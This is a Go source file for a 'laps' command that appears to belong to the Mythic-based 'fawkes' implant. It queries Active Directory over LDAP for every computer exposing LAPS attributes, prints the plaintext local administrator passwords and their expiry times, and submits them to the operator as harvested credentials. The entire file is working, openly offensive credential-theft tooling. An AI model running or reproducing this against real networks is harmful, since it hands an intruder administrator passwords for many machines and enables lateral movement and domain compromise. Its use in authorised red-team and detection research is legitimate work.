package commands

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

type LapsCommand struct{}

func (c *LapsCommand) Name() string        { return "laps" }
func (c *LapsCommand) Description() string { return "Read LAPS passwords from Active Directory (T1552.006)" }

type lapsArgs struct {
	Server   string `json:"server"`
	Username string `json:"username"`
	Password string `json:"password"`
	Filter   string `json:"filter"`
	UseTLS   bool   `json:"use_tls"`
	Port     int    `json:"port"`
	BaseDN   string `json:"base_dn"`
}

// lapsV2Password represents the JSON structure of ms-LAPS-Password
type lapsV2Password struct {
	AccountName string `json:"n"`
	Timestamp   string `json:"t"`
	Password    string `json:"p"`
	ManagedName string `json:"a"`
}

func (c *LapsCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -server <DC> -username <user@domain> -password <pass> [-filter <computer>]",
			Status:    "error",
			Completed: true,
		}
	}

	var args lapsArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" {
		return structs.CommandResult{
			Output:    "Error: server parameter required (domain controller IP or hostname)",
			Status:    "error",
			Completed: true,
		}
	}

	// Reuse LDAP connection helpers from ldap_query.go
	connArgs := ldapQueryArgs{
		Server:   args.Server,
		Port:     args.Port,
		Username: args.Username,
		Password: args.Password,
		UseTLS:   args.UseTLS,
	}
	if connArgs.Port <= 0 {
		if connArgs.UseTLS {
			connArgs.Port = 636
		} else {
			connArgs.Port = 389
		}
	}

	conn, err := ldapConnect(connArgs)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LDAP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer conn.Close()

	if err := ldapBind(conn, connArgs); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error binding to LDAP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error detecting base DN: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Build filter for computers with LAPS attributes
	lapsFilter := "(&(objectClass=computer)(|(ms-Mcs-AdmPwd=*)(ms-LAPS-Password=*)(ms-LAPS-EncryptedPassword=*)))"
	if args.Filter != "" {
		escaped := ldap.EscapeFilter(args.Filter)
		lapsFilter = fmt.Sprintf("(&(objectClass=computer)(sAMAccountName=*%s*)(|(ms-Mcs-AdmPwd=*)(ms-LAPS-Password=*)(ms-LAPS-EncryptedPassword=*)))", escaped)
	}

	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		0, 30, false,
		lapsFilter,
		[]string{
			"sAMAccountName", "dNSHostName", "operatingSystem",
			"ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
			"ms-LAPS-Password", "ms-LAPS-PasswordExpirationTime",
			"ms-LAPS-EncryptedPassword",
		},
		nil,
	)

	result, err := conn.SearchWithPaging(searchReq, 500)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error searching LDAP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output, creds := formatLAPSResults(result, baseDN, args.Filter)

	cmdResult := structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		cmdResult.Credentials = &creds
	}
	return cmdResult
}

// filetimeToTime converts a Windows FILETIME (100-ns intervals since 1601-01-01) to Go time.
func filetimeToTime(ft int64) time.Time {
	const epochDiff = 11644473600
	seconds := ft/10000000 - epochDiff
	return time.Unix(seconds, 0).UTC()
}

func lapsExpiryStatus(expTime time.Time) string {
	remaining := time.Until(expTime)
	if remaining < 0 {
		return "EXPIRED"
	}
	days := int(remaining.Hours() / 24)
	hours := int(remaining.Hours()) % 24
	if days > 0 {
		return fmt.Sprintf("expires in %dd %dh", days, hours)
	}
	return fmt.Sprintf("expires in %dh", hours)
}

func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) (string, []structs.MythicCredential) {
	var sb strings.Builder
	var creds []structs.MythicCredential

	sb.WriteString("LAPS Password Recovery\n")
	sb.WriteString(fmt.Sprintf("Base DN: %s\n", baseDN))
	if filter != "" {
		sb.WriteString(fmt.Sprintf("Filter: *%s*\n", filter))
	}
	sb.WriteString(fmt.Sprintf("Results: %d computers with readable LAPS passwords\n", len(result.Entries)))
	sb.WriteString(strings.Repeat("=", 70) + "\n")

	if len(result.Entries) == 0 {
		sb.WriteString("\nNo computers found with readable LAPS passwords.\n")
		sb.WriteString("Possible reasons:\n")
		sb.WriteString("  - LAPS is not deployed in this domain\n")
		sb.WriteString("  - Current account lacks Read permission on LAPS attributes\n")
		sb.WriteString("  - No computers match the filter\n")
		return sb.String(), nil
	}

	for i, entry := range result.Entries {
		name := entry.GetAttributeValue("sAMAccountName")
		fqdn := entry.GetAttributeValue("dNSHostName")
		osInfo := entry.GetAttributeValue("operatingSystem")

		sb.WriteString(fmt.Sprintf("\n[%d] %s", i+1, name))
		if fqdn != "" {
			sb.WriteString(fmt.Sprintf(" (%s)", fqdn))
		}
		sb.WriteString("\n")
		if osInfo != "" {
			sb.WriteString(fmt.Sprintf("    OS:       %s\n", osInfo))
		}

		// LAPS v1
		v1Pass := entry.GetAttributeValue("ms-Mcs-AdmPwd")
		v1Exp := entry.GetAttributeValue("ms-Mcs-AdmPwdExpirationTime")
		if v1Pass != "" {
			sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v1)\n", v1Pass))
			if v1Exp != "" {
				if ft, err := strconv.ParseInt(v1Exp, 10, 64); err == nil {
					expTime := filetimeToTime(ft)
					sb.WriteString(fmt.Sprintf("    Expires:  %s (%s)\n", expTime.Format("2006-01-02 15:04 UTC"), lapsExpiryStatus(expTime)))
				}
			}
			creds = append(creds, structs.MythicCredential{
				CredentialType: "plaintext",
				Account:        name,
				Credential:     v1Pass,
				Comment:        "laps (v1)",
			})
		}

		// Windows LAPS v2 (plaintext JSON)
		v2Pass := entry.GetAttributeValue("ms-LAPS-Password")
		v2Exp := entry.GetAttributeValue("ms-LAPS-PasswordExpirationTime")
		if v2Pass != "" {
			var v2 lapsV2Password
			if err := json.Unmarshal([]byte(v2Pass), &v2); err == nil {
				account := v2.ManagedName
				if account == "" {
					account = v2.AccountName
				}
				if account != "" {
					sb.WriteString(fmt.Sprintf("    Account:  %s  (LAPS v2)\n", account))
				}
				sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v2)\n", v2.Password))
				if v2.Timestamp != "" {
					sb.WriteString(fmt.Sprintf("    Updated:  %s\n", v2.Timestamp))
				}
				credAccount := account
				if credAccount == "" {
					credAccount = name
				}
				creds = append(creds, structs.MythicCredential{
					CredentialType: "plaintext",
					Account:        credAccount,
					Credential:     v2.Password,
					Comment:        "laps (v2)",
				})
			} else {
				sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v2 raw)\n", v2Pass))
			}
			if v2Exp != "" {
				if ft, err := strconv.ParseInt(v2Exp, 10, 64); err == nil {
					expTime := filetimeToTime(ft)
					sb.WriteString(fmt.Sprintf("    Expires:  %s (%s)\n", expTime.Format("2006-01-02 15:04 UTC"), lapsExpiryStatus(expTime)))
				}
			}
		}

		// Windows LAPS v2 (encrypted)
		v2Enc := entry.GetRawAttributeValue("ms-LAPS-EncryptedPassword")
		if len(v2Enc) > 0 {
			sb.WriteString(fmt.Sprintf("    Encrypted: %d bytes (requires DPAPI backup key)\n", len(v2Enc)))
		}
	}

	return sb.String(), creds
}
